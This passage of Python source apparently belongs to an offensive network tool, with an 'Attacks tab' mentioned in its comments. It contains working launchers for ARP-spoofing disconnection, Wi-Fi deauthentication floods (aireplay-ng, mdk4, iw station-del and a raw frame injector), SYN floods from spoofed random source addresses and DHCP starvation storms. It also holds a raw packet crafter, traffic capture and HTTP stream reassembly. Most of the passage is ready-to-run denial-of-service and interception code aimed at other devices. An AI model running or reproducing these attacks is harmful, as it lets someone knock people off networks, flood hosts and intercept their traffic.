            raise RuntimeError(str(e))
        return False

def check_monitor_mode_ioctl(iface):
    """Fallback ioctl-based monitor mode check for stock Android (when iw unavailable).

    Queries the current wireless mode using SIOCGIWMODE without requiring iw utility.
    Robust to missing wireless extensions (returns False rather than crashing).

    Returns: True if monitor mode is active, False if managed/AP/unknown or unavailable.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            ifreq = struct.pack('16sH', iface.encode()[:15], 0)
            res = fcntl.ioctl(sock.fileno(), 0x8913, ifreq)  # SIOCGIWMODE
            mode = struct.unpack('H', res[16:18])[0]
            # nl80211 monitor mode = 6 (IW_MODE_MONITOR); also handle wext variants
            is_monitor = mode == 6 or mode == 3
            if not is_monitor:
                add_log('dev', f'Interface {iface} mode {mode} (not monitor)')
            return is_monitor
        finally:
            sock.close()
    except (OSError, IOError, struct.error) as e:
        add_log('dev', f'Monitor mode ioctl check failed on {iface}: {type(e).__name__}')
        return False

def check_monitor_support(iface):
    """Check if monitor mode is supported by the interface/driver.

    Resolves the specific phy backing `iface` and inspects its advertised
    "Supported interface modes" -- never actually switches modes, so a
    routine capability check cannot itself drop the Wi-Fi connection. This
    used to fall back to flipping the interface into monitor mode and back
    just to test it, and to a blanket `iw phy` dump (every radio on the
    system, not just this one) for the initial check -- both fixed here.

    Falls back to ioctl-based check on Android where iw is unavailable.
    """
    try:
        dev_info = subprocess.check_output(
            ['iw', 'dev', iface, 'info'], stderr=subprocess.DEVNULL, text=True, timeout=5)
        m = re.search(r'^\s*wiphy (\d+)', dev_info, re.MULTILINE)
        if not m:
            return False
        phy = f'phy{m.group(1)}'
        phy_info = subprocess.check_output(
            ['iw', 'phy', phy, 'info'], stderr=subprocess.DEVNULL, text=True, timeout=5)
        modes_match = re.search(r'Supported interface modes:\s*\n((?:\s+\*.*\n?)+)', phy_info)
        if not modes_match:
            return False
        return any(re.match(r'\s*\*\s*monitor\s*$', line) for line in modes_match.group(1).splitlines())
    except Exception:
        # iw not available (stock Android). Fallback to ioctl check.
        return check_monitor_mode_ioctl(iface)

# ---------- native (no-monitor-mode) deauth via AP station-del ----------
# When this device's own Wi-Fi interface is running as an access point (e.g. a
# rooted-Android hotspot), the kernel can be told to deauth one of ITS OWN
# connected stations via `iw dev <if> station del <mac> subtype 0xC` -- a real
# nl80211 primitive, no monitor mode, no packet injection, interface stays
# fully operational. This does NOT let a client interface forge deauth frames
# at other devices on a network it merely joined; there is no netlink shortcut
# for that -- it genuinely requires monitor mode + an injection-capable driver,
# which is why that path (below) is left untouched.
def get_iface_type(iface):
    """Return the current nl80211 interface type (managed, AP, monitor, ...) or None if unknown."""
    try:
        out = subprocess.check_output(['iw', 'dev', iface, 'info'], stderr=subprocess.DEVNULL, text=True, timeout=5)
        m = re.search(r'^\s*type (\S+)', out, re.MULTILINE)
        return m.group(1) if m else None
    except:
        return None

def list_ap_stations(iface):
    """MAC addresses of stations currently associated to this AP-mode interface."""
    try:
        out = subprocess.check_output(['iw', 'dev', iface, 'station', 'dump'], stderr=subprocess.DEVNULL, text=True, timeout=5)
    except:
        return []
    return [m.lower() for m in re.findall(r'^Station ([0-9a-fA-F:]{17})', out, re.MULTILINE)]

def native_deauth_station(iface, mac, reason_code=2):
    """Send a real kernel-native deauth to an associated station. Only valid when iface is our own AP."""
    try:
        res = subprocess.run(['iw', 'dev', iface, 'station', 'del', mac, 'subtype', '0xC', 'reason-code', str(reason_code)],
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return res.returncode == 0
    except:
        return False

def deauth_capability(iface):
    """What mechanism kick_client/start_attack_deauth will actually use for this interface, honestly.

    There is no nl80211/iw primitive for a managed-mode (client) interface to
    forge a frame at a third-party device while staying associated -- iw's own
    command surface confirms it (mgmt dump frame is receive-only, mpath probe
    is mesh-specific, vendor send is an opaque per-driver channel, and station
    del only reaches entries in this interface's own station table, which in
    client mode is just the AP itself). So there are exactly three honest
    outcomes: this interface is itself an AP (native station-del works), the
    driver genuinely advertises monitor mode (real frame injection works), or
    neither -- in which case the ARP-poisoning fallback is the best available
    substitute, not a real deauth.
    """
    iface_type = get_iface_type(iface)
    if iface_type == 'AP':
        return {'method': 'native', 'iface_type': iface_type, 'ap_station_count': len(list_ap_stations(iface))}
    if check_monitor_support(iface):
        return {'method': 'monitor', 'iface_type': iface_type}
    if get_state('gateway'):
        return {'method': 'arp_fallback', 'iface_type': iface_type}
    return {'method': 'unavailable', 'iface_type': iface_type}

def syn_flood_capability():
    """What mechanism start_attack_syn_flood will actually use.

    SYN Flood requires root to send raw TCP packets. It prefers hping3 (a
    dedicated tool with no dependencies) but falls back to raw sockets if
    hping3 is not installed.
    """
    if os.geteuid() != 0:
        return {'method': 'unavailable', 'reason': 'not_root'}
    # Check if hping3 is available
    hping3_available = ensure_tool('hping3')
    return {'method': 'available', 'tool': 'hping3' if hping3_available else 'raw_socket'}

# ---------- checksum helpers ----------
def ip_checksum(data):
    if len(data) % 2 == 1:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def tcp_checksum(ip_src, ip_dst, tcp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
    checksum_data = psh + tcp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def udp_checksum(ip_src, ip_dst, udp_segment):
    psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
    checksum_data = psh + udp_segment
    if len(checksum_data) % 2 == 1:
        checksum_data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# ---------- custom packet builder ----------
MAC_RE = re.compile(r'^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$')
IPV4_RE = re.compile(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$')
TCP_FLAG_BITS = {'FIN': 0x01, 'SYN': 0x02, 'RST': 0x04, 'PSH': 0x08, 'ACK': 0x10, 'URG': 0x20}

def build_custom_packet(spec):
    """Construct one raw Ethernet+IP(+TCP/UDP/ICMP) frame from a user-supplied spec
    and return its bytes. Pure construction, no sending -- reuses the same
    struct-packing and checksum helpers (ip_checksum/tcp_checksum/udp_checksum)
    already used by the attack launchers above, just exposed directly instead
    of only ever running inside a generated flood script.
    """
    proto = spec['protocol']
    src_mac = bytes.fromhex(spec['src_mac'].replace(':', ''))
    dst_mac = bytes.fromhex(spec['dst_mac'].replace(':', ''))
    payload = spec.get('payload', b'')

    eth = dst_mac + src_mac + struct.pack('!H', 0x0800)

    if proto == 'tcp':
        ip_proto = 6
    elif proto == 'udp':
        ip_proto = 17
    elif proto == 'icmp':
        ip_proto = 1
    else:  # raw
        ip_proto = int(spec.get('ip_proto', 253))  # 253/254 are IANA-reserved for experimentation

    if proto == 'tcp':
        flags_byte = 0
        for name in spec.get('tcp_flags', []):
            flags_byte |= TCP_FLAG_BITS.get(name.upper(), 0)
        tcp_hdr = struct.pack('!HHIIBBHHH',
                               spec['src_port'], spec['dst_port'],
                               spec.get('seq', 0), spec.get('ack', 0),
                               5 << 4, flags_byte, 65535, 0, 0)
        checksum = tcp_checksum(spec['src_ip'], spec['dst_ip'], tcp_hdr + payload)
        tcp_hdr = tcp_hdr[:16] + struct.pack('!H', checksum) + tcp_hdr[18:]
        l4 = tcp_hdr + payload
    elif proto == 'udp':
        udp_hdr = struct.pack('!HHHH', spec['src_port'], spec['dst_port'], 8 + len(payload), 0)
        checksum = udp_checksum(spec['src_ip'], spec['dst_ip'], udp_hdr + payload)
        udp_hdr = udp_hdr[:6] + struct.pack('!H', checksum) + udp_hdr[8:]
        l4 = udp_hdr + payload
    elif proto == 'icmp':
        icmp_type = spec.get('icmp_type', 8)
        icmp_code = spec.get('icmp_code', 0)
        icmp_hdr = struct.pack('!BBHHH', icmp_type, icmp_code, 0, spec.get('icmp_id', 1), spec.get('icmp_seq', 1))
        checksum = ip_checksum(icmp_hdr + payload)
        icmp_hdr = icmp_hdr[:2] + struct.pack('!H', checksum) + icmp_hdr[4:]
        l4 = icmp_hdr + payload
    else:
        l4 = payload

    total_len = 20 + len(l4)
    ttl = spec.get('ttl', 64)
    ip_hdr_no_checksum = struct.pack('!BBHHHBBH', 0x45, 0, total_len, spec.get('ip_id', 0), 0, ttl, ip_proto, 0) \
        + socket.inet_aton(spec['src_ip']) + socket.inet_aton(spec['dst_ip'])
    ip_checksum_val = ip_checksum(ip_hdr_no_checksum)
    ip_hdr = ip_hdr_no_checksum[:10] + struct.pack('!H', ip_checksum_val) + ip_hdr_no_checksum[12:]

    return eth + ip_hdr + l4

def send_custom_packet(spec, count=1, interval_ms=0):
    """Send build_custom_packet()'s frame `count` times on spec['iface']. Returns
    (bytes_sent_total, last_frame_bytes) so the caller can show a hex preview of
    exactly what went out. `count` is expected to already be caller-clamped to a
    small number -- this is a crafting/testing tool, not a flood launcher (the
    Attacks tab's weapons already cover sustained floods, with their own risk
    gate); sending the same one-off frame more than a couple dozen times isn't
    what this is for.
    """
    frame = build_custom_packet(spec)
    sent = 0
    for i in range(count):
        success, method, error = SocketProxy.send_packet(frame, spec['iface'])
        if not success:
            add_log('error', f'Packet injection failed ({method}): {error}')
            raise RuntimeError(f'Failed to send custom packet via {method}: {error}')
        sent += len(frame)
        if i < count - 1 and interval_ms > 0:
            time.sleep(interval_ms / 1000.0)
    return sent, frame

# ---------- attack launchers ----------
def start_attack_arp_freeze(targets, gateway, iface):
    add_log('info', f'Starting ARP Freeze on {iface} for {len(targets)} targets')
    pids = []
    if ensure_tool('arpspoof', 'dsniff'):
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', t, gateway]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
                error_msg = f'arpspoof failed for target {t}'
                if stderr:
                    error_msg += f': {stderr}'
                raise RuntimeError(error_msg)
            pids.append(proc)
        for t in targets:
            cmd = ['arpspoof', '-i', iface, '-t', gateway, t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                stderr = proc.stderr.read().decode(errors='ignore').strip() if proc.stderr else ''
                error_msg = f'arpspoof failed for gateway {gateway}'
                if stderr:
                    error_msg += f': {stderr}'
                raise RuntimeError(error_msg)
            pids.append(proc)
        return pids
    else:
        # Fallback: raw socket ARP spoof with Android compatibility
        fake_mac = '02:00:00:00:00:01'
        script = textwrap.dedent(f"""
            import socket, struct, time, sys, os
            IFACE = '{iface}'
            GATEWAY = '{gateway}'
            TARGETS = {targets}
            FAKE = bytes.fromhex('{fake_mac.replace(':','')}')

            def send_arp(op, src_ip, dst_ip, src_mac, dst_mac):
                try:
                    eth = dst_mac + src_mac + struct.pack('!H', 0x0806)
                    arp = struct.pack('!HHBBH', 1, 0x0800, 6, 4, op)
                    arp += src_mac + socket.inet_aton(src_ip)
                    arp += dst_mac + socket.inet_aton(dst_ip)
                    packet = eth + arp

                    # Try AF_PACKET first (Linux native)
                    try:
                        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
                        s.bind((IFACE, 0))
                        s.send(packet)
                        s.close()
                        return True
                    except (OSError, PermissionError):
                        pass

                    # Fallback to AF_INET (works on some Android devices)
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        s.sendto(packet, (dst_ip, 0))
                        s.close()
                        return True
                    except (OSError, PermissionError):
                        pass

                    # Last resort: use ping to trigger ARP (less reliable but works on restricted devices)
                    try:
                        os.system(f'ping -c 1 -W 1 {{dst_ip}} 2>/dev/null &')
                        return True
                    except:
                        pass

                    return False
                except Exception as e:
                    print(f'ARP send failed: {{e}}', file=sys.stderr)
                    return False

            while True:
                for t in TARGETS:
                    send_arp(2, GATEWAY, t, FAKE, b'\\xff'*6)
                    send_arp(2, t, GATEWAY, FAKE, b'\\xff'*6)
                time.sleep(0.5)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            stderr = proc.stderr.read().decode(errors='ignore') if proc.stderr else ''
            raise RuntimeError(f'ARP fallback script exited immediately: {stderr}')
        # Monitor stderr from the ARP script in background
        def monitor_arp_fallback(proc_ref, path_ref):
            try:
                proc_ref.wait()
                if proc_ref.returncode != 0:
                    stderr = proc_ref.stderr.read().decode(errors='ignore') if proc_ref.stderr else ''
                    add_log('warn', f'ARP fallback script exited with code {proc_ref.returncode}: {stderr}')
            finally:
                try:
                    os.unlink(path_ref)
                except:
                    pass
        threading.Thread(target=monitor_arp_fallback, args=(proc, path), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_deauth_native(targets, iface):
    """Continuously re-deauth targets that are associated stations on our own AP -- no monitor mode."""
    stations = set(list_ap_stations(iface))
    target_macs = []
    for t_ip in targets:
        for h in STATE['hosts']:
            if h['ip'] == t_ip and h['mac'].lower() in stations:
                target_macs.append(h['mac'])
                break
    if not target_macs:
        raise RuntimeError(f'{iface} is running as an access point, but none of the selected targets are currently associated stations on it.')
    add_log('info', f'{iface} is in AP mode -- using native kernel deauth flood (station-del), no monitor mode, for {len(target_macs)} station(s)')
    script = textwrap.dedent(f"""
        import subprocess, time
        IFACE = '{iface}'
        MACS = {target_macs}
        while True:
            for mac in MACS:
                subprocess.run(['iw', 'dev', IFACE, 'station', 'del', mac, 'subtype', '0xC', 'reason-code', '2'],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
    """)
    fd, path = tempfile.mkstemp(suffix='.py')
    os.close(fd)
    with open(path, 'w') as f:
        f.write(script)
    proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
    time.sleep(0.5)
    if proc.poll() is not None:
        raise RuntimeError('Native deauth flood script exited immediately')
    threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
    return [proc]

def start_attack_deauth(targets, gateway, iface):
    add_log('info', f'Starting Deauth Flood on {iface} for {len(targets)} targets')
    if get_iface_type(iface) == 'AP':
        return start_attack_deauth_native(targets, iface)
    # First check if monitor mode is supported
    if not check_monitor_support(iface):
        # No monitor mode/injection means no real 802.11 deauth is possible from
        # client mode -- true of essentially every stock Android Wi-Fi chipset.
        # Fall back to the sustained ARP-poison technique (same as ARP Freeze):
        # it achieves the same practical outcome, cutting the targets off the
        # network, via a mechanism that works on any hardware, though it's a
        # network-layer disconnect rather than a real 802.11 deauth.
        add_log('warn', f'{iface} does not support monitor mode/frame injection (typical for a phone\'s built-in Wi-Fi) -- falling back to ARP-based disconnection instead of a true 802.11 deauth')
        return start_attack_arp_freeze(targets, gateway, iface)
    if not set_monitor(iface, True, raise_on_fail=True):
        raise RuntimeError('Failed to enable monitor mode')
    update_state('monitor_mode_active', True)
    pids = []
    gateway_mac = get_gateway_mac(iface, STATE['gateway']) if STATE['gateway'] else None

    if ensure_tool('aireplay-ng', 'aircrack-ng'):
        if targets and gateway_mac:
            for t_ip in targets:
                t_mac = None
                for h in STATE['hosts']:
                    if h['ip'] == t_ip:
                        t_mac = h['mac']
                        break
                if t_mac:
                    cmd = ['aireplay-ng', '-0', '0', '-a', gateway_mac, '-c', t_mac, iface]
                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
                    time.sleep(0.1)
                    if proc.poll() is not None:
                        continue
                    pids.append(proc)
        if not pids:
            cmd = ['aireplay-ng', '-0', '0', '-a', 'FF:FF:FF:FF:FF:FF', iface]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                raise RuntimeError('aireplay-ng broadcast deauth failed')
            pids.append(proc)
        return pids
    elif ensure_tool('mdk4'):
        cmd = ['mdk4', iface, 'd', '-c', '100']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('mdk4 deauth failed')
        pids.append(proc)
        return pids
    else:
        # Fallback raw deauth
        script = textwrap.dedent(f"""
            import socket, struct, time
            IFACE = '{iface}'
            radiotap = b'\\x00\\x00\\x0c\\x00\\x04\\x80\\x00\\x00\\x00'
            def deauth_packet(dst, bssid, seq):
                frame_control = struct.pack('<H', 0x00c0)
                duration = b'\\x00\\x00'
                seq_control = struct.pack('<H', seq & 0xfff)
                reason = struct.pack('<H', 7)
                frame = frame_control + duration + dst + bssid + bssid + seq_control + reason
                return radiotap + frame
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((IFACE, 0))
            seq = 0
            bssid = b'\\xff'*6
            while True:
                sock.send(deauth_packet(b'\\xff'*6, bssid, seq))
                seq = (seq + 1) & 0xfff
                time.sleep(0.1)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('Deauth fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_syn_flood(targets, port, iface):
    add_log('info', f'Starting SYN Flood on {iface}:{port} for {len(targets)} targets')
    pids = []
    if ensure_tool('hping3'):
        for t in targets:
            cmd = ['hping3', '-S', '-p', str(port), '--flood', '--rand-source', t]
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
            time.sleep(0.1)
            if proc.poll() is not None:
                continue
            pids.append(proc)
        if not pids:
            raise RuntimeError('No hping3 processes started')
        return pids
    else:
        # Raw socket fallback
        script = textwrap.dedent(f"""
            import socket, struct, random, time, sys
            TARGETS = {targets}
            PORT = {port}
            def tcp_checksum(ip_src, ip_dst, tcp_segment):
                psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 6) + struct.pack('!H', len(tcp_segment))
                checksum_data = psh + tcp_segment
                if len(checksum_data) % 2 == 1:
                    checksum_data += b'\\x00'
                s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
                s = (s >> 16) + (s & 0xffff)
                s += s >> 16
                return ~s & 0xffff
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while True:
                for t in TARGETS:
                    try:
                        src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
                        iph = b'\\x45\\x00\\x00\\x28' + struct.pack('!H', random.randint(0,65535)) + b'\\x40\\x00\\x40\\x06\\x00\\x00'
                        iph += socket.inet_aton(src_ip) + socket.inet_aton(t)
                        tcp = struct.pack('!HHIIBBHHH', random.randint(1024,65535), PORT, 0,0, 0x50,0x02, 5840,0,0)
                        tcp = tcp[:16] + struct.pack('!H', tcp_checksum(src_ip, t, tcp)) + tcp[18:]
                        pkt = iph + tcp
                        s.sendto(pkt, (t,0))
                    except Exception as e:
                        pass
                time.sleep(0.01)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('SYN flood fallback script exited immediately')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

def start_attack_dhcp_storm(targets, gateway, iface):
    add_log('info', f'Starting DHCP Storm on {iface} targeting DHCP server {gateway}')
    pids = []
    if ensure_tool('dhcpig'):
        cmd = ['dhcpig', '-i', iface, '-t', gateway, '-s', '1000']
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
        time.sleep(0.1)
        if proc.poll() is not None:
            raise RuntimeError('dhcpig failed to start')
        pids.append(proc)
        return pids
    else:
        # Fallback raw DHCP storm
        script = textwrap.dedent(f"""
            import socket, struct, random, time
            IFACE = '{iface}'
            GATEWAY = '{gateway}'
            our_mac = bytes.fromhex('{get_mac(iface).replace(':','')}')
            BROADCAST = '255.255.255.255'
            def udp_checksum(ip_src, ip_dst, udp_segment):
                psh = socket.inet_aton(ip_src) + socket.inet_aton(ip_dst) + b'\\x00' + struct.pack('!B', 17) + struct.pack('!H', len(udp_segment))
                checksum_data = psh + udp_segment
                if len(checksum_data) % 2 == 1:
                    checksum_data += b'\\x00'
                s = sum(struct.unpack('!%dH' % (len(checksum_data)//2), checksum_data))
                s = (s >> 16) + (s & 0xffff)
                s += s >> 16
                return ~s & 0xffff
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            while True:
                src_ip = '.'.join(str(random.randint(1,254)) for _ in range(4))
                iph = b'\\x45\\x00\\x01\\x10' + struct.pack('!H', random.randint(0,65535)) + b'\\x00\\x00\\x40\\x11\\x00\\x00'
                iph += socket.inet_aton(src_ip) + socket.inet_aton(BROADCAST)
                udp = struct.pack('!HHH', 68, 67, 0x0100)
                udp = udp + b'\\x00\\x00'
                dhcp = b'\\x01\\x01\\x06\\x00'
                dhcp += struct.pack('!I', random.randint(0, 2**32 - 1))
                dhcp += b'\\x00\\x00\\x00\\x00'
                dhcp += socket.inet_aton('0.0.0.0') * 4
                dhcp += our_mac + b'\\x00' * 10
                dhcp += b'\\x00' * 192
                dhcp += b'\\x63\\x82\\x53\\x63'
                dhcp += struct.pack('BB', 53, 1) + b'\\x01'
                dhcp += struct.pack('BB', 61, 7) + b'\\x01' + our_mac
                dhcp += b'\\xff'
                dhcp += b'\\x00' * (256 - len(dhcp))
                udp = udp[:4] + struct.pack('!H', udp_checksum(src_ip, BROADCAST, udp + dhcp)) + udp[6:]
                pkt = iph + udp + dhcp
                s.sendto(pkt, (BROADCAST, 67))
                time.sleep(0.2)
        """)
        fd, path = tempfile.mkstemp(suffix='.py')
        os.close(fd)
        with open(path, 'w') as f:
            f.write(script)
        proc = subprocess.Popen(['python3', path], stderr=subprocess.PIPE)
        time.sleep(0.5)
        if proc.poll() is not None:
            raise RuntimeError('DHCP storm fallback script exited immediately (raw socket permission likely denied)')
        threading.Thread(target=lambda: (proc.wait(), os.unlink(path)), daemon=True).start()
        pids.append(proc)
        return pids

COMMON_PORTS = {
    20: 'FTP-DATA', 21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
    67: 'DHCP', 68: 'DHCP', 80: 'HTTP', 110: 'POP3', 123: 'NTP', 137: 'NetBIOS',
    138: 'NetBIOS', 139: 'SMB', 143: 'IMAP', 161: 'SNMP', 194: 'IRC', 443: 'HTTPS',
    445: 'SMB', 465: 'SMTPS', 587: 'SMTP', 993: 'IMAPS', 995: 'POP3S',
    1194: 'OpenVPN', 1433: 'MSSQL', 1723: 'PPTP', 3306: 'MySQL', 3389: 'RDP',
    5060: 'SIP', 5222: 'XMPP', 5353: 'mDNS', 5900: 'VNC', 6667: 'IRC',
    8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 51820: 'WireGuard',
}

def port_service_name(port):
    return COMMON_PORTS.get(port, str(port))

def compute_traffic_stats():
    with STATE_LOCK:
        entries = list(STATE['monitor_entries'])
    if not entries:
        return {'total': 0, 'unique_hosts': 0, 'total_bytes': 0, 'top_talkers': [], 'top_ports': [], 'timeline': [0] * 30}
    total_bytes = sum(e.get('len', 0) for e in entries)
    hosts, ports = {}, {}
    for e in entries:
        for h in (e['src'], e['dst']):
            b = hosts.setdefault(h, {'count': 0, 'bytes': 0})
            b['count'] += 1
            b['bytes'] += e.get('len', 0)
        # The service port is conventionally the lower of the two -- using dp alone
        # would mislabel response packets (their dp is the remote's ephemeral port).
        # ICMP has no ports at all, so it doesn't belong in a port breakdown.
        if 'sp' in e and 'dp' in e:
            key = (e['proto'], min(e['sp'], e['dp']))
            p = ports.setdefault(key, {'count': 0, 'bytes': 0})
            p['count'] += 1
            p['bytes'] += e.get('len', 0)
    top_talkers = sorted(
        ({'host': h, 'count': v['count'], 'bytes': v['bytes']} for h, v in hosts.items()),
        key=lambda x: -x['bytes'])[:8]
    top_ports = sorted(
        ({'proto': proto, 'port': port, 'service': port_service_name(port), 'count': v['count'], 'bytes': v['bytes']}
         for (proto, port), v in ports.items()),
        key=lambda x: -x['bytes'])[:8]
    now = time.time()
    bucket_seconds, n_buckets = 2, 30
    timeline = [0] * n_buckets
    for e in entries:
        idx = n_buckets - 1 - int((now - e.get('t', now)) // bucket_seconds)
        if 0 <= idx < n_buckets:
            timeline[idx] += 1
    return {
        'total': len(entries),
        'unique_hosts': len(hosts),
        'total_bytes': total_bytes,
        'top_talkers': top_talkers,
        'top_ports': top_ports,
        'timeline': timeline,
    }

HTTP_METHOD_PREFIXES = (b'GET ', b'POST ', b'PUT ', b'HEAD ', b'DELETE ', b'OPTIONS ', b'PATCH ', b'CONNECT ', b'HTTP/1.')

def reassemble_tcp_streams(entries=None):
    """Reassemble fragmented HTTP requests/responses from captured TCP segments
    of the same flow by tracking sequence numbers -- a single packet's payload
    (what http_info/tls_sni already show elsewhere) is often just the first
    segment; a real response spanning multiple packets needs its bytes
    stitched together in the right order before it can be parsed as one
    HTTP message.

    Each direction of each TCP connection is reassembled independently (a
    request and its response are two different flows here, not one merged
    conversation), using only in-order segments -- if a gap is ever detected
    (a segment whose sequence number doesn't pick up where the last one left
    off), reassembly for that flow stops there rather than guessing at the
    missing bytes; this is a diagnostic tool, not a full TCP stack, so it
    never fabricates data it didn't actually capture in order.
    """
    if entries is None:
        with STATE_LOCK:
            entries = list(STATE['monitor_entries'])

    flows = {}
    for e in entries:
        if e.get('proto') != 'tcp' or 'payload_hex' not in e or 'seq' not in e:
            continue
        payload = bytes.fromhex(e['payload_hex'])
        if not payload:
            continue
        key = (e['src'], e['sp'], e['dst'], e['dp'])
        flows.setdefault(key, []).append((e['seq'], payload))

    results = []
    for (src, sp, dst, dp), segments in flows.items():
        segments.sort(key=lambda s: s[0])
        first_seq, first_payload = segments[0]
        assembled = bytearray(first_payload)
        next_seq = (first_seq + len(first_payload)) & 0xFFFFFFFF
        gap_detected = False
        packet_count = 1
        for seq, payload in segments[1:]:
            if seq == next_seq:
                assembled += payload
                next_seq = (next_seq + len(payload)) & 0xFFFFFFFF
                packet_count += 1
            elif seq < next_seq:
                continue  # retransmission/overlap of bytes already assembled -- skip, don't duplicate
            else:
                gap_detected = True
                break

        if not bytes(assembled[:16]).startswith(HTTP_METHOD_PREFIXES):
            continue  # not HTTP -- nothing meaningful to reassemble it into

        result = {
            'src': src, 'sp': sp, 'dst': dst, 'dp': dp,
            'packet_count': packet_count, 'total_bytes': len(assembled),
            'gap_detected': gap_detected,
        }
        header_end = assembled.find(b'\r\n\r\n')
        if header_end == -1:
            result.update(complete=False, status_line=None, headers={}, body_preview=None, body_truncated=False)
            results.append(result)
            continue

        lines = assembled[:header_end].decode('ascii', 'replace').split('\r\n')
        headers = {}
        for line in lines[1:]:
            if ':' in line:
                k, v = line.split(':', 1)
                headers[k.strip()] = v.strip()
        result['status_line'] = lines[0]
        result['headers'] = headers

        body = bytes(assembled[header_end + 4:])
        chunked = 'chunked' in headers.get('Transfer-Encoding', '').lower()
        content_length = headers.get('Content-Length')
        if chunked:
            result['complete'] = False
            result['note'] = 'Transfer-Encoding: chunked -- not decoded, showing raw bytes as received'
        elif content_length is not None:
            try:
                cl = int(content_length)
                result['complete'] = len(body) >= cl
                body = body[:cl]
            except ValueError:
                result['complete'] = not gap_detected
        else:
            result['complete'] = not gap_detected

        body_cap = 2000
        result['body_truncated'] = len(body) > body_cap
        result['body_preview'] = body[:body_cap].decode('utf-8', 'replace')
        results.append(result)

    results.sort(key=lambda r: -r['total_bytes'])
    return results

def start_network_port_monitor(port, iface):
    """Monitor ALL network traffic on a specific port (network-wide listening).

    Unlike start_attack_monitor which filters by specific target IPs, this
    monitors the entire network for any device using the given port.

    Captures both directions: devices connecting TO that port (server listening)
    and devices connecting FROM that port (client source port).

    Returns process ID for monitoring.
    """
    add_log('info', f'Starting Network-Wide Port Monitor on {iface}:{port}')
    with STATE_LOCK:
        STATE['port_monitor_entries'] = []

    tmpdir = tempfile.gettempdir()
    log_path = os.path.join(tmpdir, f"godhand_port_monitor_{port}_{int(time.time())}.log")

    script = textwrap.dedent(f"""
        import socket, struct, select, time, sys, json
        IFACE = '{iface}'
        PORT = {port}
        PROTO_NAMES = {{6: 'tcp', 17: 'udp', 1: 'icmp'}}

        # Track devices and connections on this port
        devices = {{}}  # {{(src_ip, dst_ip): {{'proto': 'tcp', 'packets': N, 'bytes': B, 'last_seen': time}}}}

        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
